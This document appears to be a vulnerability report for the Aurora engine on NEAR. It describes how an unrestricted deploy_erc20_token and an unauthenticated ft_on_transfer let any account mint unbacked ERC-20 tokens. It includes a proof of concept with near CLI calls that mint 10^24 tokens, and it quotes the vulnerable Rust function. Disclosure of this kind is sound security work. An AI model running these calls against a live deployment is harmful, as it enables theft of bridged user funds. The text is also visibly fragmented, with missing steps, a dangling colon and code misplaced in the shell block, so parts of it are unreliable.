### Title
Unrestricted `deploy_erc20_token` + Unauthenticated `ft_on_transfer` Enables Any NEAR Account to Mint Unbacked ERC-20 Tokens — (File: `engine/src/contract_methods/connector.rs`)

---

### Summary

Any unprivileged NEAR account can (1) register an arbitrary NEP-141 account ID as an ERC-20 on Aurora via the access-control-free `deploy_erc20_token` entrypoint, then (2) directly call `ft_on_transfer` on the Aurora engine from that same account with a self-specified `amount`, causing the engine to mint an arbitrary quantity of the corresponding ERC-20 token with no real NEP-141 backing. This breaks the 1:1 bridge invariant and constitutes insolvency for the affected ERC-20 mirror token.

---

**Step 2 — Unauthenticated minting via `ft_on_transfer`.**

`ft_on_transfer` dispatches on `predecessor_account_id`: if it equals the stored eth-connector account it mints base ETH; otherwise it calls `receive_erc20_tokens` using the predecessor as the NEP-141 key:

---

### Impact Explanation

The attacker mints an unbounded quantity of ERC-20 tokens whose only backing is supposed to be NEP-141 tokens held by the Aurora engine. Because no real NEP-141 transfer occurred, the ERC-20 supply for the attacker's token immediately exceeds the NEP-141 balance held by Aurora — **bridge insolvency** for that token. If any on-Aurora DeFi protocol (AMM, lending market) accepts the minted token, the attacker can swap it for real bridged assets (ETH, USDC mirrors, etc.), constituting direct theft of user funds. Even without a DeFi vector, the bridge invariant is permanently broken for the registered token.

---

### Likelihood Explanation

The attack requires only a standard NEAR account and two public contract calls. No privileged key, no deposit, no governance action, and no social engineering is needed. The `deploy_erc20_token` entrypoint is fully open to any NEAR caller, and `ft_on_transfer` is a standard public NEAR method. Likelihood is **high**.

---

### Recommendation

1. **Add access control to `deploy_erc20_token`**: gate it with `require_owner_only` (or a dedicated whitelist) so only the Aurora owner/operator can register new NEP-141 ↔ ERC-20 mappings.
2. **Verify `ft_on_transfer` is called via the proper FT callback chain**: use `env.assert_private_call()` or check that the call originates from a promise created by a legitimate `ft_transfer_call`, rather than accepting direct calls from arbitrary NEAR accounts.

### Proof of Concept

```

# 2. Attacker calls deploy_erc20_token on the Aurora engine (no access control):
near call aurora deploy_erc20_token \

  --accountId attacker.near

# Aurora registers: attacker.near → <new_erc20_address>

# 3. Attacker directly calls ft_on_transfer from attacker.near
#    with a self-chosen amount (e.g. 10^24) and their EVM address as msg:
near call aurora ft_on_transfer \
  '{"sender_id":"attacker.near","amount":"1000000000000000000000000","msg":"<attacker_evm_addr_hex>"}' \
  --accountId attacker.near

# looks up the registered ERC-20, and calls mint(<attacker_evm_addr>, 10^24)
# as the engine admin — minting 10^24 unbacked ERC-20 tokens.
# No real NEP-141 transfer ever occurred.

pub fn deploy_erc20_token<I: IO + Copy, E: Env, P: PromiseHandler>(
    nep141: AccountId,
    metadata: Option<Erc20Metadata>,
    io: I,
    env: &E,
    handler: &mut P,
) -> Result<Address, DeployErc20Error> {
    let current_account_id = env.current_account_id();
    let input = setup_deploy_erc20_input(&current_account_id, metadata);
    let mut engine: Engine<_, _> = Engine::new(
        aurora_engine_sdk::types::near_account_to_evm_address(
            env.predecessor_account_id().as_bytes(),
        ),
        current_account_id,
        io,
        env,
    )
    .map_err(DeployErc20Error::State)?;

    let address = match engine.deploy_code_with_input(input, None, handler) {
        Ok(result) => match result.status {
            TransactionStatus::Succeed(ret) => {
                Address::new(H160(ret.as_slice().try_into().unwrap()))
            }
            other => return Err(DeployErc20Error::Failed(other)),
        },
        Err(e) => return Err(DeployErc20Error::Engine(e)),
    };

    sdk::log!("Deployed ERC-20 in Aurora at: {:#?}", address);
    engine
        .register_token(address, nep141)
        .map_err(DeployErc20Error::Register)?;

    Ok(address)
}
